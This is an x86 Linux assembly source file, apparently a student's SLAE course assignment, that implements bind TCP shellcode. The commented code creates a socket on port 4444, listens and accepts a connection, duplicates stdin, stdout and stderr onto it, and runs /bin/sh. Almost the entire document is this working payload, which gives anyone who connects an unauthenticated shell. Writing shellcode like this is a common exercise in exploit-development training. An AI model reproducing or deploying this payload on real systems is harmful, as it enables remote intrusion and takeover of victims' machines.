; SLAE - Assignment #1: Shell Bind TCP Shellcode (Linux/x86)
; Author: Alain Menelet 
; StudentID - SALE-3763
; Tested on Ubuntu 16.14.03 LTS
; https://github.com/xophidia/Shellcode/blob/master/compile.sh


global _start

section .text

_start:

	; Create a socket

	xor ebx, ebx 				; ebx = 0
	mul ebx					; eax=ebx=edx = 0
	push ebx				; push 0 onto the stack
	inc ebx					; ebx = 1
	push ebx				; push 1 onto the stack
	push byte 0x2				; push 2 onto the stack
	mov ecx, esp				; set ecx to the address of our args
	mov al, 0x66				; syscall socketcall
	int 0x80				; make the syscall socketcall(socket(2,1,0))

	; Bind to a port

	xchg eax, edx				; save sockfd into edx
	pop ebx					; set ebx = 2 (bind)
	pop esi					; pop 1
	push word 0x5c11			; push 4444 port onto the stack
	push word bx				; push 2 onto the stack
	mov ecx, esp				; set ecx the address of our args
	push 0x10				; push 16
	push ecx				; push address of our args
	push edx				; push sockfd
	mov ecx, esp				; ecx = end of the stack
	mov al, 0x66
	int 0x80				; make the syscall  socketcall(bind(sockfd, [2,4444,0], 16))

	; Listen a connection

	mov [ecx+0x4], eax			; we use the stack (ebx is still in the stack and ecx+4 will set to 0)
	mov bl, 0x4				; syscall listen
	mov al, 0x66		
	mov ecx, esp
	int 0x80				; make the syscall socketcall(listen(sockfd,0))

	; Accept

	mov [ecx+0x8], eax			; we use the stack to put the second 0
	mov bl, 0x5				; syscall accept
	mov al, 0x66	
	mov ecx, esp
	int 0x80				; make the syscall socketcall(accept(sockfd,0,0))


	; Redirect stdin, stdout and stderr

	xchg ebx, eax				; we save eax

	xor ecx, ecx
	mov cl, 0x2				; ecx = 2
_:
	mov al, 0x3f				; syscall dup2
	int 0x80
	dec ecx
	jns _

	; execute the shell /bin/sh

	xor ecx,ecx				; ecx = 0
	mul ecx					; eax = edx =ecx = 0
	push eax				; push 0 onto the stack
	push 0x68732f2f				; push //bin/sh
	push 0x6e69622f
	mov ebx, esp				; save esp into ebx
	mov al, 0xb		
	int 0x80				; make the syscall execve("/bin/sh", NULL, NULL)

